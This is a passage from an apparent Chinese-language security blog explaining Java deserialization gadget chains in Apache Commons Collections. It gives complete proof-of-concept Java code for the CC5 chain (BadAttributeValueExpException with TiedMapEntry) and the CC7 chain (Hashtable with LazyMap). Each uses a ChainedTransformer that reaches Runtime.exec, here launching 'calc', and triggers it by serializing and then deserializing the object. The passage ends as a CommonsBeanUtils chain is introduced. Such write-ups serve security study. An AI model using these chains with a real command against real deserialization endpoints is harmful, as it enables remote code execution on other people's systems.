    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h3><p>这条链子就与CC6的链子差别不大，在LazyMap之后的链子完全相同，就入口类有差别，入口类换成了BadAttributeValueExpException中的readObject和TiedMapEntry类中的getValue中调用get，然后POC如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">MyCC5</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> decorateMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"MyPOC5.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"MyPOC5.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h3><p>这条链子也是在cc6上的基础上修改的，将入口类修改成Hashtablez的readObject，然后在Hashtable中reconstitutionPut方法在，这个这个方法中存在一个equals方法的调用，在AbstractMapDecorator中存在equals，在AbstractMap类中存在equals方法调用了get方法，然后与LazyMap的get接上就行</p>
<p>poc如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">MyCC7</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 构造 setValue 的可控参数</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> decorateMap1 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        decorateMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> decorateMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        decorateMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        decorateMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">serialize</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"MyPOC7.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"MyPOC7.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>到此就算是基本完事了。</p>
<h3 id="CB链"><a href="#CB链" class="headerlink" title="CB链"></a>CB链</h3><h4 id="CommonsBeanUtils-简介"><a href="#CommonsBeanUtils-简介" class="headerlink" title="CommonsBeanUtils 简介"></a>CommonsBeanUtils 简介</h4><p>CommonsBeanUtils 是 Apache Commons 提供的一个工具包，主要用于简化 JavaBean 属性的操作。它属于 Apache Commons 项目下的一个子项目，提供了一些实用工具类来操作 JavaBean，如属性的复制、属性访问、转换等。</p>
<p>举个例子：</p>
<p>baby是一个最简单的JavaBean</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Baby</span> <span class="token punctuation">&#123;</span>  
    <span class="token keyword">private</span> <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"Drunkbaby"</span><span class="token punctuation">;</span>  
  
 <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">void</span> setName <span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里我们设置了一个get和set方法。</p>
<p><font style="color:rgb(80, 80, 92);">Commons-BeanUtils 中提供了一个静态方法 </font><code>PropertyUtils.getProperty</code><font style="color:rgb(80, 80, 92);"> ，让使用者可以直接调用任意 JavaBean 的 getter 方法，示例如下</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">PropertyUtils</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CBMethods</span> <span class="token punctuation">&#123;</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">PropertyUtils</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Baby</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

